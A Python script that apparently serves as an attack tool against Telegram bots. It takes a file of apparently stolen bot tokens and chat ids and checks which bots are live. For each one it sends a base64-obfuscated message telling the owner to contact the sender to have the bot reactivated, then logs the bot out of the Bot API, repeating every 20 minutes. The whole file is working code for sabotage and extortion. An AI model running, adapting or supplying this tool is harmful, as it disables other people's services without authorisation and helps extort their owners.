import json
import threading
import time
import base64
import requests
import os

 
def check_target(token_info):
    token = token_info["token"]
    url = f'https://api.telegram.org/bot{token}/getme'
    response = requests.get(url)
    return response.json()
 
 
def send_text(token, user_id, text):
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    payload = {'chat_id': user_id, 'text': text, 'parse_mode': 'html'}
    response = requests.get(url, params=payload)
    return response.json()
 
 
def logOut(token):
    url = f'https://api.telegram.org/bot{token}/logOut'
    response = requests.get(url)
    return response.json()
 
 
def worker(task_id, token_info):
    token = token_info["token"]
    id = token_info["id"]
    print(f"[+] [{token}] [Task {task_id} started]")
 
    while True:
        enc = f"8J2QkvCdkITwnZCT8J2QhPCdkIvwnZCA8J2QhyDwnZCP8J2QhPCdkJLwnZCA8J2QjSDwnZCI8J2QjfCdkIgsIPCdkIHwnZCO8J2QkyDwnZCA8J2QjfCdkIPwnZCAIPCdkJPwnZCI8J2Qg/CdkIDwnZCKIPCdkIPwnZCA8J2Qj/CdkIDwnZCTIPCdkIzwnZCE8J2QjfCdkIbwnZCI8J2QkfCdkIjwnZCMIPCdkI/wnZCE8J2QkvCdkIDwnZCNIPCdkIDwnZCP8J2QgPCdkI/wnZCU8J2QjS4KCvCdkIfwnZCU8J2QgfCdkJTwnZCN8J2QhvCdkIgg8J2QkvCdkIDwnZCY8J2QgCDwnZCJ8J2QiPCdkIrwnZCAIPCdkIjwnZCN8J2QhvCdkIjwnZCNIPCdkIPwnZCI8J2QgPCdkIrwnZCT8J2QiPCdkIXwnZCK8J2QgPCdkI0g8J2QivCdkITwnZCM8J2QgfCdkIDwnZCL8J2QiC4KCuOAkCBodHRwczovL3QubWUveFR3ZW50enkg44CRIA=="
        text = base64.b64decode(enc)
 
        response = send_text(token, id, text)
        if response.get('ok'):
            print(
                f"[-] [{token}] [Task {task_id}] [Status: {response['ok']}] ..... Logging Out")
            response = logOut(token)
            time.sleep(1200)
        else:
            print(
                f"[+] [{token}] [Task {task_id}] [{response.get('description')}]")
            if response.get('error_code') == 429:
                print(
                    f"[-] [{id}] [Task {task_id}] [Sleeping for {response['parameters']['retry_after']} seconds]")
                time.sleep(response['parameters']['retry_after'])
            elif response.get('error_code') == 403:
                time.sleep(60)
            time.sleep(3)
 
 
def main():
    print("""
    fb.me/habibul.fzn
    """)
 
    # Config
    threads = []
    stop_event = threading.Event()
    target_filename = 'target_logout.json'  # Target token files
    last_modified_time = None
 
    while True:
        current_modified_time = os.path.getmtime(target_filename)
        if current_modified_time != last_modified_time:
            last_modified_time = current_modified_time
 
            # Load target.json
            with open(target_filename, 'r') as file:
                print("[+] Checking Target List...")
                target_data = json.load(file)
 
            print("[+]", len(target_data), "Target found, Checking target...")
            count_r = 0
            count_list = 0
            for i, token_info in enumerate(target_data):
                check_data_target = check_target(token_info)
                if check_data_target.get('ok', False):
                    count_list += 1
                    print(
                        f"[{count_list}] [LIVE] [{token_info['token']}] [Username: {check_data_target['result']['username']}] [ID: {check_data_target['result']['id']}]")
                    count_r += 1
                else:
                    count_list += 1
                    print(
                        f"[{count_list}] [ALREADY DEAD] [{token_info['token']}]")
 
            print(f"[-] {count_r} Target Live.")
            time.sleep(3)
 
            # Create and start threads
            threads.clear()
            for i, token_info in enumerate(target_data):
                thread = threading.Thread(
                    target=worker, args=(i + 1, token_info))
                threads.append(thread)
                thread.start()
 
        time.sleep(1)
 
 
if __name__ == "__main__":
    main()
